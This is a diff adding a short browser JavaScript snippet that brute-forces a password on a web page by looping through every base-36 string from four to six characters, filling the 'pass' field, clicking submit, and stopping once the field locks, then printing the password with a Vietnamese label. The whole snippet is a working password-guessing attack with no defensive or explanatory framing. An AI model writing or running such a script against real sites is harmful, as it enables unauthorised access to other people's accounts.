@@ -1,0 +1,12 @@
+let str = "";
+for(i=parseInt("aaaa", 36);i<=parseInt("zzzzzz", 36);i++)
+{
+	str = i.toString(36);
+	console.log(str);
+	document.getElementById("pass").value = str;
+	document.getElementById('submitPass').click();	
+	if(document.getElementById("pass").disabled == true){ 
+        break;
+    }	
+}
+console.log('Pass là: ' + str);
